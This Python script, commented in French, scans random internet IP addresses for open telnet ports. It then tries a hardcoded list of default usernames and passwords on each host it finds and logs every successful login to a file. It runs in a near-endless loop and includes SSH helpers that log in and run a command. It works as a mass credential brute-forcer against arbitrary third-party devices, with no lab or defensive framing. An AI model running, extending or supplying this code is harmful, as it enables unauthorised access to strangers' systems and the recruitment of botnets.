import socket
import random
import paramiko
import warnings

warnings.filterwarnings("ignore", category=DeprecationWarning)
import telnetlib


def scan_ports(ip):
    ports = [23]
    result = {"ip": ip}

    open_found = False

    for port in ports:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                if s.connect_ex((ip, port)) == 0:
                    result[port] = True
                    open_found = True
                else:
                    result[port] = False
        except Exception:
            result[port] = False

    if not open_found:
        return False

    return result


def generer_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))


def ssh_connect(ip, port, username, password):
    try:
        # Création du client SSH
        client = paramiko.SSHClient()

        # Accepter automatiquement les clés inconnues (pratique en test)
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Connexion
        client.connect(hostname=ip, port=port, username=username, password=password)

        print("Connexion réussie !")

        # Exécuter une commande
        stdin, stdout, stderr = client.exec_command("whoami")
        print("Résultat :", stdout.read().decode())

        # Fermer la connexion
        client.close()

    except Exception as e:
        print("Erreur :", e)


def telnet_command(host, username, password, command):
    tn = telnetlib.Telnet(host)

    tn.read_until(b"login: ")
    tn.write(username.encode() + b"\n")

    tn.read_until(b"Password: ")
    tn.write(password.encode() + b"\n")

    tn.write(command.encode() + b"\n")

    result = tn.read_all().decode()
    print(result)

    tn.close()


import paramiko


def check_ssh(ip, port, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(ip, port=port, username=username, password=password, timeout=5)
        client.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception:
        return False


import telnetlib


def check_telnet(host, port, username, password):
    try:
        tn = telnetlib.Telnet(host, port, timeout=5)

        tn.read_until(b"login: ")
        tn.write(username.encode() + b"\n")

        tn.read_until(b"Password: ")
        tn.write(password.encode() + b"\n")

        # Si connexion acceptée, on peut lire un prompt
        response = tn.read_until(b"$", timeout=2)

        tn.close()

        return True
    except Exception:
        return False


credentials = {
    "admin": "admin",
    "admin_2": "123456",
    "admin_3": "password",
    "admin_4": "admin123",
    "user": "123456",
    "user_2": "password",
    "root": "root",
    "test": "test",
    "guest": "guest",
    "administrator": "admin"
}


def main():
    ip = generer_ip()
    result = scan_ports(ip)  # ex : {'ip': '192.168.1.1', 22: True, 23: False}
    if result:
        print(result)
        with open("hey.txt", "a") as f:
            f.write(f"{result}\n")
        if result[23]:
            for username in credentials:
                password = credentials[username]
                telnet_is = check_telnet(ip, 22, username, password)
                if telnet_is:
                    print(f'telnet ok for {ip} avec username = {username} et password = {password}')
                    with open("hey.txt", "a") as f:
                        f.write(f"telnet ok for {ip} avec username = {username} et password = {password}\n")


for i in range(100000000000000000000):
    main()


